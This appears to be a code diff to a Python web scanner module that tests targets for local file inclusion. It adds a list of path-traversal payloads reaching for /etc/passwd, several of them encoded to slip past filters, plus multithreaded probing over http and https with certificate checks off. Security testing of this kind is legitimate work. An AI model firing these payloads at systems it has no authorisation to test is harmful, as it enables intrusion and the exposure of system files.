@@ -1,41 +1,61 @@
 import requests
 import os
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from config import HTTP_HEADERS, DEFAULT_TIMEOUT
 from module.other import Other
 
 class LFIScanner:
-    def __init__(self, target):
-        self.target = target
+    def __init__(self, args):
+        self.target = args.target
+        self.thread = args.threads
         self.payloads = [
             "../../../../etc/passwd",
-            "..%2F..%2F..%2Fetc%2Fpasswd"
+            "../../../etc/passwd",
+            "../../../../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+            "..%c0%af../etc/passwd",
+            "..%c1%9c../etc/passwd",
+            "..%e0%80%af../etc/passwd",
+            "..\\..\\..\\etc\\passwd",
+            "..%5c..%5c..%5cetc%5cpasswd",
+            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "%2e%2e\\%2e%2e\\%2e%2e\\etc\\passwd"
         ]
         self.module_name = os.path.splitext(os.path.basename(__file__))[0]
         self.printer = Other()
 
-    def scan(self):
+    def check_payload(self, url):
+        try:
+            r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
+            if "root:x" in r.text:
+                return url
+        except:
+            return None
+        return None
+
+    def run(self):
         colored_module = self.printer.color_text(self.module_name, "cyan")
-        results = []
+        protocols = ["http", "https"]
+        tasks = []
 
-        for payload in self.payloads:
-            try:
-                url = f"http://{self.target}/?file={payload}"
-                r = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT)
-                if "root:x" in r.text:
-                    colored_payload = self.printer.color_text(payload, "yellow")
+        with ThreadPoolExecutor(max_workers=self.thread) as executor:
+            for proto in protocols:
+                for payload in self.payloads:
+                    url = f"{proto}://{self.target}/?file={payload}"
+                    tasks.append(executor.submit(self.check_payload, url))
+
+            results = []
+            for future in as_completed(tasks):
+                result = future.result()
+                if result:
+                    colored_payload = self.printer.color_text(result, "yellow")
                     print(f"[*] [Module: {colored_module}] [Detected: LFI] [Payload: {colored_payload}]")
-                    results.append({"vulnerable": True, "payload": url})
-                    break
-            except Exception as e:
-                colored_error = self.printer.color_text(str(e), "red")
-                print(f"[!] [Module: {colored_module}] [Error: {colored_error}]")
-                results.append({"error": str(e)})
+                    return [{"vulnerable": True, "payload": result}]
 
-        if not results:
-            print(f"[*] [Module: {colored_module}] No LFI detected.")
-            results.append({"vulnerable": False})
-
-        return results
+        print(f"[*] [Module: {colored_module}] No LFI detected.")
+        return [{"vulnerable": False}]
 
 def scan(args=None):
-    return LFIScanner(args.target).scan()
+    return LFIScanner(args).run()
